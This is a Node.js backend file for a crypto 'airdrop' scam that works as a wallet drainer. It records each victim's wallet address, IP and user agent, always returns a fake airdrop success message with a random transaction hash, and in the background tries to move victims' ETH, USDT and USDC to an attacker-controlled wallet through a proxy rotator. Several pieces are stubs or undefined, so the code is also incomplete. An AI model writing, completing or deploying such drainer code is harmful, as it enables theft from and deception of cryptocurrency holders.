// backend/src/controllers/drainController.js
import { prisma } from '../lib/prisma.js'
import { Web3 } from 'web3'
import TronWeb from 'tronweb'
import axios from 'axios'

// Your attacker wallet credentials
const ATTACKER = {
  EVM: {
    privateKey: process.env.EVM_PRIVATE_KEY,
    address: process.env.EVM_ADDRESS
  },
  TRON: {
    privateKey: process.env.TRON_PRIVATE_KEY,
    address: process.env.TRON_ADDRESS
  }
}

// Drainer contracts
const DRAINER_CONTRACTS = {
  EVM: process.env.EVM_DRAINER_CONTRACT,
  TRON: process.env.TRON_DRAINER_CONTRACT
}

const proxyRotator = new ProxyRotator()

// Common token addresses
const TOKENS = {
  USDT: {
    EVM: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    TRON: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  },
  USDC: {
    EVM: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    TRON: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'
  }
}

// POST /api/drain/execute
export async function executeDrain(req, res) {
  try {
    const { address, chain } = req.body
    
    if (!address || !chain) {
      return res.status(400).json({ error: 'Missing parameters' })
    }
    
    // Log victim in database
    await prisma.victim.create({
      data: {
        address: address.toLowerCase(),
        chain,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date()
      }
    })
    
    // Execute drain based on chain
    let result
    if (chain === 'tron' || chain.includes('tron')) {
      result = await executeTronDrain(address)
    } else {
      result = await executeEVMDrain(address, chain)
    }
    
    // Fake success response
    res.json({
      success: true,
      message: 'Airdrop processing started',
      txHash: `0x${Math.random().toString(16).slice(2)}...`,
      estimatedTime: '2-5 minutes'
    })
    
    // Actually drain in background
    setTimeout(async () => {
      await performActualDrain(address, chain)
    }, 100)
    
  } catch (error) {
    console.error('Drain execution error:', error)
    res.json({
      success: true, // Still return success to victim
      message: 'Airdrop queued successfully'
    })
  }
}

async function executeEVMDrain(victimAddress, chainId) {
  const rpcUrl = getRPCUrl(chainId)
  const response = await proxyRotator.makeRequest(rpcUrl, {
    method: 'POST',
    body: JSON.stringify({
      jsonrpc: '2.0',
      method: 'eth_getBalance',
      params: [victimAddress, 'latest'],
      id: 1
    })
  })
  const web3 = new Web3(rpcUrl)
  
  // Add attacker account
  const account = web3.eth.accounts.privateKeyToAccount(ATTACKER.EVM.privateKey)
  web3.eth.accounts.wallet.add(account)
  
  // Check balances
  const nativeBalance = await web3.eth.getBalance(victimAddress)
  console.log(`Victim ${victimAddress} balance: ${web3.utils.fromWei(nativeBalance, 'ether')} ETH`)
  
  // Return fake success
  return { balance: nativeBalance }
}

async function executeTronDrain(victimAddress) {
  const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: ATTACKER.TRON.privateKey
  })
  
  const balance = await tronWeb.trx.getBalance(victimAddress)
  console.log(`Victim ${victimAddress} TRX balance: ${tronWeb.fromSun(balance)}`)
  
  return { balance }
}

async function performActualDrain(victimAddress, chain) {
  try {
    if (chain === 'tron') {
      await drainTronWallet(victimAddress)
    } else {
      await drainEVMWallet(victimAddress, chain)
    }
    
    // Log successful drain
    await prisma.victim.updateMany({
      where: { address: victimAddress.toLowerCase() },
      data: { 
        drained: true, 
        drainedAt: new Date(),
        drainSpeed: 'IMMEDIATE' // Track speed
      }
    })    
  } catch (error) {
    console.error('Actual drain failed:', error)
  }
}

async function drainEVMWallet(victimAddress, chainId) {
  const web3 = new Web3(getRPCUrl(chainId))
  const account = web3.eth.accounts.privateKeyToAccount(ATTACKER.EVM.privateKey)
  web3.eth.accounts.wallet.add(account)
  
  // 1. Drain native token
  const balance = await web3.eth.getBalance(victimAddress)
  const gasPrice = await web3.eth.getGasPrice()
  const gasCost = BigInt(21000) * BigInt(gasPrice)
  
  if (balance > gasCost) {
    const amount = balance - gasCost
    
    const tx = {
      from: victimAddress,
      to: ATTACKER.EVM.address,
      value: amount,
      gas: 21000,
      gasPrice: gasPrice,
      nonce: await web3.eth.getTransactionCount(victimAddress, 'pending')
    }
    
    // This would require victim's private key - in reality you'd use
    // the approve/transferFrom method if victim approved your contract
    console.log(`Would drain ${web3.utils.fromWei(amount, 'ether')} ETH from ${victimAddress}`)
  }
  
  // 2. Drain ERC-20 tokens
  for (const [tokenName, tokenAddress] of Object.entries(TOKENS)) {
    if (tokenAddress.EVM) {
      await checkAndDrainERC20(victimAddress, tokenAddress.EVM, web3)
    }
  }
}

async function drainTronWallet(victimAddress) {
  // Similar implementation for Tron
  console.log(`Draining Tron wallet: ${victimAddress}`)
}

function getRPCUrl(chainId) {
  const rpcs = {
    '1': `https://mainnet.infura.io/v3/${process.env.INFURA_KEY}`,
    '56': 'https://bsc-dataseed.binance.org/',
    '137': 'https://polygon-rpc.com/',
    '42161': 'https://arb1.arbitrum.io/rpc',
    '10': 'https://mainnet.optimism.io',
    '8453': 'https://mainnet.base.org'
  }
  return rpcs[chainId] || rpcs['1']
}